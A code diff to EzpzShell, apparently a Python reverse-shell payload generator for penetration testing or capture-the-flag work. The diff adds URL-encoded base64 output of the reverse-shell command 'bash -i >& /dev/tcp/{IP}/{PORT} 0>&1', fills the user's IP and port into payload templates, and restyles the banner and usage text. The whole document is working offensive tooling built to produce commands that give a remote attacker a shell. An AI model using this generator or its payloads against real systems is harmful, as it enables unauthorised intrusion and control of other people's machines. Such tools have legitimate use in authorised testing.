@@ -11,6 +11,7 @@
 
 import sys,re,os,base64,pickle,string,random
 import netifaces as ni
+import urllib.parse
 from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
 
 
@@ -34,7 +35,7 @@ def header():
  | |____ / /| |_) / / ____) | | | |  __/ | |
  |______/___| .__/___|_____/|_| |_|\___|_|_|
             | |
-            |_|'''+f'''\n\n{colors.CYAN}[Payload Available]
+            |_|'''+f'''\n\n{colors.CYAN}-------- [{colors.RESET} PAYLOAD AVAILABLE {colors.CYAN}] --------
 {colors.RESET}''')
 	# Payload Listing
 	counter = 0
@@ -45,7 +46,8 @@ def header():
 			counter = 0
 			print()
 	print(f'''{colors.CYAN}
-\n[Usage]\n{colors.ORANGE}\npython3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')
+\n{colors.CYAN}-------- [{colors.RESET} USAGE {colors.CYAN}] --------
+{colors.RESET}{colors.ORANGE}\npython3 {sys.argv[0].split("/")[-1]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py{colors.RESET}''')
 
 def load_shell():
 	listShell = open("/opt/Tools/EzpzShell/shell.txt").read()
@@ -54,6 +56,10 @@ def load_shell():
 			payload[list(payload.keys())[counter]].append(j)
 
 def base64gen(ip,port):
+	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
+	return base64.b64encode(temp.encode('ascii'))
+
+def base64gen_urlencode(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('ascii'))
 
@@ -173,11 +179,11 @@ if __name__ == "__main__":
 		if aa:
 			ip = sys.argv[1]
 		else:
-			print("\nCheck If IP is valid")
+			print(f"\n{colors.CYAN}-------- [{colors.RESET}  {colors.CYAN}] --------{colors.RESET}")
 			ip = sys.argv[1]
 
 	for counter,j in enumerate(payload[options.lower()]):
-		print(f"\n{colors.GREEN}Example {counter+1}{colors.RESET}\n")
+		print(f"\n{colors.CYAN}-------- [{colors.RESET} Example {counter+1} {colors.CYAN}] --------{colors.RESET}\n")
 		if "{BASE64}" in j:
 			temp = base64gen(ip,port)
 			full_temp = j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
@@ -186,6 +192,10 @@ if __name__ == "__main__":
 				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))
 			else:
 				print(full_temp)
+		elif "{BASE64_URLENCODE}" in j:
+			temp = urllib.parse.quote(base64gen_urlencode(ip,port).decode("ascii"))
+			full_temp = j.strip().replace("{BASE64_URLENCODE}",temp).replace("{IP}",ip).replace("{PORT}",port).strip()
+			print(full_temp)
 		elif "{BASE64_FULL}" in j:
 			temp = base64gen_full(ip,port)
 			full_temp = j.strip().replace("{BASE64_FULL}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
